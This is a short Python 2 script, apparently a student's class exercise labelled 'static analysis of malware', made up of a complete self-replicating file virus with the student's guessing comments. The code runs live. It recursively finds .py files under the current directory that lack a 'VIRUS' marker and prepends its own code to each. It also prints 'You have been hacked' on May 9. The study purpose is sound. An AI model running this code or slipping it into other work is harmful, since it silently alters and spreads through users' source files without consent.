#!/usr/bin/python

# Author: Jansen Lefever
# Class: 301D2 Ops Challenge 14
# Purpose: Static analysis of malware


import os
import datetime

SIGNATURE = "VIRUS"
# defining a func
def locate(path):
    files_targeted = [] # var conationing list
    filelist = os.listdir(path) # creating a list of all the files in  dir
    for fname in filelist: # for loop
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted # guess is the this for loop runs thru dir to find as mandy files as it can and puts it into a var calles files_targeted

def infect(files_targeted): # func with the var set as a par
    virus = open(os.path.abspath(__file__)) # works backwards thru a file path
    virusstring = ""
    for i,line in enumerate(virus):# this for loop digs deep into a file path setup up by the var 'virus'
        if 0 <= i < 39: # for 0 is less than 39? Why 39
            virusstring += line
    virus.close
    for fname in files_targeted: # this looks like it goes thru, reads the file before empting it
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

def detonate(): # this is func that says at this date and time print "you've been hacked" 
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print "You have been hacked"

# exucutes all of the above funcs
files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()
